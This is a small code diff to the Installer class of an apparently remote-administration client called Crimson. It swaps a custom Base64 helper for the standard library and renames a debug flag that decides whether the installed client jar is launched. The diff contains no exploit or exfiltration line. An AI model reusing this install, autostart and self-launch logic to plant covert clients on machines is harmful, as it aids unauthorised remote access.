@@ -17,18 +17,20 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client;
 
+import static com.subterranean_security.crimson.universal.Flags.DEV_MODE;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URISyntaxException;
+import java.util.Base64;
 
 import com.subterranean_security.crimson.client.modules.Autostart;
 import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
-import com.subterranean_security.crimson.core.util.B64Util;
 import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.universal.Universal;
 import com.subterranean_security.crimson.universal.util.JarUtil;
@@ -124,7 +126,7 @@ public class Installer {
 
 		BufferedReader input = new BufferedReader(new InputStreamReader(in));
 
-		ClientConfig cc = ClientConfig.parseFrom(B64Util.decode(input.readLine()));
+		ClientConfig cc = ClientConfig.parseFrom(Base64.getDecoder().decode(input.readLine()));
 		input.close();
 
 		return cc;
@@ -208,7 +210,7 @@ public class Installer {
 			}
 		}
 
-		if (!Universal.debug) {
+		if (!DEV_MODE) {
 			try {
 				Runtime.getRuntime().exec(os.getJavaw() + " -jar " + client.getAbsolutePath());
 			} catch (IOException e) {
